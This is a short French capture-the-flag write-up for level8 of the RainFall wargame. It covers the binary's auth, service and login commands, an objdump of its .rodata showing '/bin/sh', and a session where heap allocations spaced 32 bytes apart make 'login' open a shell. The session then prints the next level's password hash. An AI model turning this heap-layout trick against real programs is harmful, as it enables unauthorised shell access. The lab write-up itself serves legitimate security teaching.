On trouve 4 commandes : -reset -auth -service -login.
Lorsque l'on marque "auth a" cela nous set une adresse à gauche à chaque appel l'adresse augmente de 16.
Lorsque l'on marque "service a" cela nous set une adresse à droite à chaque appel l'adresse augmente de 16.
Lorsque l'on marque "login a" cela segfault.

```bash
level8@RainFall:~$ objdump -d level8 -j .rodata

level8:     file format elf32-i386

Disassembly of section .rodata:

08048808 <_fp_hw>:
 8048808:	03 00 00 00                                         ....

0804880c <_IO_stdin_used>:
 804880c:	01 00 02 00 25 70 2c 20 25 70 20 0a 00 61 75 74     ....%p, %p ..aut
 804881c:	68 20 00 72 65 73 65 74 00 73 65 72 76 69 63 65     h .reset.service
 804882c:	00 6c 6f 67 69 6e 00 2f 62 69 6e 2f 73 68 00 50     .login./bin/sh.P
 804883c:	61 73 73 77 6f 72 64 3a 0a 00                       assword:..
```

Nous remarquons qu'il faut une diffèrence de 32 (voir source) entre l'adresse de auth et l'adresse de service afin de lancer login.

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
